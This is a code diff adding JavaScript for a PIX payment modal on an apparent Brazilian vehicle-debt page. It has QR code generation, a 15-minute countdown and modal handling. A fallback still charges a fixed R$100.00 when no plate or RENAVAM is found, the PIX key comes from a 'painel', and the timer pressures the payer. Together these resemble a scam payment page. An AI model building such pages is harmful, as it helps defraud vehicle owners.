+                            });
+                    };
+                    
+                    // Configura botão QR Code
+                    document.getElementById('btnQRCode').onclick = function() {
+                        if (!qrcodeAtivo) {
+                            // Gera QR Code
+                            const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.codigoPix)}&format=png&margin=10`;
+                            document.getElementById('qrcode').innerHTML = `
+                                <img src="${qrCodeUrl}" alt="QR Code PIX" style="width: 200px; height: 200px; border-radius: 5px;">
+                            `;
+                            document.getElementById('qrcodeContainer').classList.add('active');
+                            qrcodeAtivo = true;
+                            this.innerHTML = '<i class="fas fa-times"></i> FECHAR QR';
+                        } else {
+                            // Fecha QR Code
+                            document.getElementById('qrcodeContainer').classList.remove('active');
+                            qrcodeAtivo = false;
+                            this.innerHTML = '<i class="fas fa-qrcode"></i> QR CODE';
+                        }
+                    };
+                    
+                } else {
+                    document.getElementById('codigoPix').textContent = 
+                        'Erro: ' + (data.mensagem || 'Configure chave PIX no painel');
+                }
+                
+            } catch (error) {
+                document.getElementById('codigoPix').textContent = 
+                    'Erro de conexão. Tente novamente.';
+                console.error('Erro ao gerar PIX:', error);
+            } finally {
+                // Esconde loading e mostra botões
+                document.getElementById('modalLoading').classList.add('hidden');
+                document.getElementById('opcoesPix').style.display = 'flex';
+                
+                // Inicia timer de 15 minutos
+                iniciarTimer();
+                
+                // Mostra modal
+                document.getElementById('modalPix').classList.add('active');
+                document.body.style.overflow = 'hidden';
+                console.log('✅ Modal aberto com sucesso!');
+            }
+        }
+
+        // Fallback se não conseguir capturar dados
+        function abrirModalFallback() {
+            console.log('🔄 Usando fallback para modal');
+            
+            const placa = document.getElementById('placa')?.value || 'NÃO ENCONTRADA';
+            const renavam = document.getElementById('renavam')?.value || 'NÃO ENCONTRADO';
+            
+            dadosPagamentoAtual = {
+                descricao: 'Débito do veículo',
+                valor: 100.00,
+                placa: placa,
+                renavam: renavam
+            };
+            
+            // Chama função principal com fallback
+            abrirModalPagamentoDebitoEspecifico(dadosPagamentoAtual);
+        }
+
+        // =========================================
+        // TIMER DE 15 MINUTOS
+        // =========================================
+        function iniciarTimer() {
+            segundosRestantes = 900; // 15 minutos
+            clearInterval(timerInterval);
+            
+            // Atualiza timer imediatamente
+            atualizarTimerDisplay();
+            
+            timerInterval = setInterval(() => {
+                segundosRestantes--;
+                atualizarTimerDisplay();
+                
+                if (segundosRestantes <= 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('timerPix').textContent = 'EXPIRADO';
+                    document.getElementById('timerPix').style.background = '#dc3545';
+                    document.getElementById('btnCopiarCodigo').disabled = true;
+                    document.getElementById('btnQRCode').disabled = true;
+                    document.getElementById('btnCopiarCodigo').style.opacity = '0.5';
+                    document.getElementById('btnQRCode').style.opacity = '0.5';
+                }
+            }, 1000);
+        }
+        
+        function atualizarTimerDisplay() {
+            const minutos = Math.floor(segundosRestantes / 60);
+            const segundos = segundosRestantes % 60;
+            const timerElement = document.getElementById('timerPix');
+            
+            timerElement.textContent = 
+                `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
+            
+            // Altera cor conforme tempo passa
+            if (segundosRestantes < 120) { // < 2 minutos
+                timerElement.style.background = '#ff9800';
+            }
+            
+            if (segundosRestantes < 30) { // < 30 segundos
+                timerElement.style.background = '#dc3545';
+                timerElement.style.animation = 'pulse 0.5s infinite';
+            }
+        }
+
+        // =========================================
+        // FECHAR MODAL
+        // =========================================
+        document.getElementById('fecharModal').addEventListener('click', function() {
+            fecharModal();
+        });
+
+        function fecharModal() {
+            clearInterval(timerInterval);
+            document.getElementById('modalPix').classList.remove('active');
+            document.body.style.overflow = 'auto';
+            document.getElementById('qrcodeContainer').classList.remove('active');
+            qrcodeAtivo = false;
+            document.getElementById('btnQRCode').innerHTML = '<i class="fas fa-qrcode"></i> QR CODE';
+            document.getElementById('mensagemSucesso').classList.remove('active');
+            console.log('🔒 Modal fechado');
+        }
+
+        // Fecha modal ao clicar fora
+        document.getElementById('modalPix').addEventListener('click', function(e) {
+            if (e.target === this) {
+                fecharModal();
+            }
+        });
+
+        // Fecha modal com ESC
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && document.getElementById('modalPix').classList.contains('active')) {
+                fecharModal();
             }
         });
     </script>
